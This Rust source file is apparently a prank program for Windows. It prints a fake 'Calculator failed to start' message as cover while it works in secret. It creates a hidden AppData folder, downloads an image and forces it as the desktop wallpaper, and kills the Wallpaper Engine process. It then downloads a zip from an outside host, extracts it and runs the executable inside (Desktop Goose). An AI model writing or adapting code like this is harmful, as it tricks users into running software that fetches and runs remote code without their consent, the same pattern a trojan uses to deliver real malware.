use std::{ fs, io::Cursor, path::{self, PathBuf}, process::{ Command, Stdio }, time::Duration };

fn main() {
  // Check the config dir exists
  let temp_dir = dirs::home_dir().unwrap().join("AppData/Roaming/PhazeDev/.temp");

  match fs::metadata(&temp_dir){
    Err(_) => {
      fs::create_dir(&temp_dir).unwrap();
    },
    Ok(_) => {}
  }

  println!("Calculator failed to start.");

  change_bg(temp_dir.clone());
  check_and_kill_wallpaperengine();
  goose_invasion(temp_dir);
}

fn change_bg( temp_dir: path::PathBuf ){
  // Check the file exists, if not download it.
  match fs::metadata(temp_dir.join("./hohnjammond.png")){
    Err(_) => {
      let client = reqwest::blocking::Client::new();

      let dat = client
        .get("https://cdn.phaz.uk/hohnjammond.png")
        .timeout(Duration::from_secs(120))
        .send()
        .unwrap()
        .bytes()
        .unwrap();

      fs::write(&temp_dir.join("./hohnjammond.png"), dat)
        .unwrap();
    },
    Ok(_) => {}
  }

  // Set as wallpaper
  wallpaper::set_from_path(temp_dir.join("./hohnjammond.png").as_os_str().to_str().unwrap()).unwrap();
  wallpaper::set_mode(wallpaper::Mode::Stretch).unwrap();
}

fn check_and_kill_wallpaperengine(){
  // Run a windows command to kill "wallpaper32.exe" (wallpaper engines backend)
  // Run it like 5 times cause it likes to open multiple processes

  for i in 0..5{
    dbg!(i);
    Command::new("powershell")
      .args([ "TASKKILL", "/IM wallpaper32.exe" ])
      .stdout(Stdio::null())
      .spawn().unwrap();
  }
}

fn goose_invasion( temp_dir: PathBuf ){
  // Spawn a goose??? yeah. great idea!

  // Check the file exists, if not download it.
  match fs::metadata(temp_dir.join("./goose.zip")){
    Err(_) => {
      let client = reqwest::blocking::Client::new();

      let dat = client
        .get("https://cdn.phaz.uk/goose.zip")
        .timeout(Duration::from_secs(120))
        .send()
        .unwrap()
        .bytes()
        .unwrap();

      let dat = dat.to_vec();
      zip_extract::extract(Cursor::new(dat), &temp_dir.join("./goose"), true).unwrap();
    },
    Ok(_) => {}
  }

  Command::new(temp_dir.join("./goose/DesktopGoose v0.31/GooseDesktop.exe"))
    .current_dir(temp_dir.join("./goose/DesktopGoose v0.31"))
    .stdout(Stdio::null())
    .spawn().unwrap();
}